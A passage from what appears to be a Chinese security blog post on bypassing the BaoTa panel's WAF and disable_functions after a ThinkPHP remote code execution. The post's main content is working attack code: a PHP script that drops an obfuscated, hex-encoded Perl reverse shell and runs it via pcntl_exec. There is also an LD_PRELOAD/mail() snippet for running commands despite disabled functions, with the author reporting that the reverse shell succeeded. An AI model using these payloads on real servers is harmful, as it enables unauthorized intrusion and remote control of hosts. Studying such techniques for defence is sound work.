class="string">"\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x49\x4e\x2c\x20\x22\x3c\x26\x53\x4f\x43\x4b"</span>.</span><br><span class="line"><span class="string">"\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x4f\x55\x54\x2c\x20\x22\x3e\x26\x53\x4f\x43"</span>.</span><br><span class="line"><span class="string">"\x4b\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x45\x52\x52\x2c\x20\x22\x3e\x26\x53\x4f"</span>.</span><br><span class="line"><span class="string">"\x43\x4b\x22\x3b\x0d\x0a\x73\x79\x73\x74\x65\x6d\x28\x24\x73\x68\x65\x6c\x6c\x29\x3b\x0d\x0a"</span>.</span><br><span class="line"><span class="string">"\x63\x6c\x6f\x73\x65\x20\x53\x4f\x43\x4b\x3b\x0d\x0a\x65\x78\x69\x74\x20\x30\x3b\x0a"</span>;</span><br><span class="line">$fp = fopen($file,<span class="string">'w'</span>);</span><br><span class="line">$key = fputs($fp,$data);</span><br><span class="line">fclose($fp);</span><br><span class="line"><span class="keyword">if</span>(!$key) <span class="keyword">exit</span>(<span class="string">'写入'</span>.$file.<span class="string">'失败'</span>);</span><br><span class="line">chmod($file,<span class="number">0777</span>);</span><br><span class="line">pcntl_exec($file);</span><br><span class="line">unlink($file);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'不支持pcntl扩展'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到在通过蚁剑的脚本执行插件执行这个脚本之后成功绕过宝塔的disable_function反弹shell</p>
<img src="/2019/08/24/Thinkphp%20Rce绕过宝塔面板的姿势分享/1566567424504.png" class="1566567424504">

<img src="/2019/08/24/Thinkphp%20Rce绕过宝塔面板的姿势分享/1566567405030.png" class="1566567405030">

<h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3 总结"></a>3 总结</h2><p>其实关于命令执行这点还是有些遗憾，因为尝试使用<a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">LD_PRELOAD劫持</a>没有完全成功，只能执行一些简单命令，关于这点希望有大佬能指点一二，下面是使用的代码，和执行结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$evil_cmdline = <span class="string">'id'</span>;</span><br><span class="line">$out_path = <span class="string">'/tmp/output'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"cmdline: "</span> . $evil_cmdline . <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">$evil_cmdline .= <span class="string">' &gt; '</span>. $out_path;</span><br><span class="line">putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span><br><span class="line">$so_path = <span class="string">'/tmp/bypass_disablefunc_x64.so'</span>;</span><br><span class="line">putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);</span><br><span class="line"></span><br><span class="line">mail(<span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"output: "</span> . nl2br(file_get_contents($out_path));</span><br></pre></td></tr></table></figure>

<img src="/2019/08/24/Thinkphp%20Rce绕过宝塔面板的姿势分享/1566569823871.png" class="1566569823871">

<p>总的来说，全流程绕过宝塔WAF的目的还是达到了，也有一点点微薄的产出，希望大家不吝赐教更多的绕过思路。</p>

    </div>

    
    
    
        
      

      <footer class="post-footer">
          
            
          
          <div class="post-tags">
            
              <a href="/tags/宝塔/" rel="tag"># 宝塔</a>
            
              <a href="/tags/Thinkphp/" rel="tag"># Thinkphp</a>
            
              <a href="/tags/绕过/" rel="tag"># 绕过</a>
            
          </div>
        

        

          <div class="post-nav">
            <div class="post-nav-next post-nav-item">
              
                <a href="/2018/12/21/Cobalt Strike 3.12 界面中文乱码解决方案/" rel="next" title="Cobalt Strike 3.12 界面中文乱码解决方案">
                  <i class="fa fa-chevron-left"></i> Cobalt Strike 3.12 界面中文乱码解决方案
                </a>
              
            </div>

            <span class="post-nav-divider"></span>

            <div class="post-nav-prev post-nav-item">
              
            </div>
          </div>
        
      </footer>
    
  </div>
  
  
  
  </article>

  </div>


          </div>
          

        </div>
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">
        
        
        
        
      

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0-起因"><span class="nav-number">1.</span> <span class="nav-text">0 起因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-工具和环境"><span class="nav-number">2.</span> <span class="nav-text">1 工具和环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-测试过程"><span class="nav-number">3.</span> <span class="nav-text">2 测试过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-环境"><span class="nav-number">3.1.</span> <span class="nav-text">2.1 环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-宝塔规则模拟"><span class="nav-number">3.2.</span> <span class="nav-text">2.2 宝塔规则模拟</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-GetShell方法"><span class="nav-number">3.3.</span> <span class="nav-text">2.3 GetShell方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-绕过方式探究"><span class="nav-number">3.4.</span> <span class="nav-text">2.4 绕过方式探究</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-4-1-Copy函数绕过"><span class="nav-number">3.4.1.</span> <span class="nav-text">2.4.1 Copy函数绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-4-2-变形一句话"><span class="nav-number">3.4.2.</span> <span class="nav-text">2.4.2 变形一句话</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-5-AntSword绕过宝塔WAF"><span class="nav-number">4.</span> <span class="nav-text">2.5 AntSword绕过宝塔WAF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-绕过禁用函数执行系统命令"><span class="nav-number">4.1.</span> <span class="nav-text">2.6 绕过禁用函数执行系统命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-总结"><span class="nav-number">5.</span> <span class="nav-text">3 总结</span></a></li></ol></div>
        
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Skactor</p>
  <div class="site-description" itemprop="description">专注信息安全</div>
</div>
  <nav class="site-state motion-element">
      <div class="site-state-item site-state-posts">
        
          <a href="/archives/">
        
          <span class="site-state-item-count">13</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
    
      
      
      <div class="site-state-item site-state-categories">
        
        <span class="site-state-item-count">10</span>
        <span class="site-state-item-name">分类</span>
        
      </div>
    
      
      
      <div class="site-state-item site-state-tags">
        
        <span class="site-state-item-count">26</span>
        <span class="site-state-item-name">标签</span>
        
      </div>
    
  </nav>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Skactor</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.4.0</div>

        












        
      </div>
    </footer>
  </div>

  


  <script src="/lib/anime.min.js?v=3.1.0"></script>
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
<script src="/js/schemes/muse.js?v=7.4.0"></script>
<script src="/js/next-boot.js?v=7.4.0"></script>



  





















  

  

  

</body>
</html>
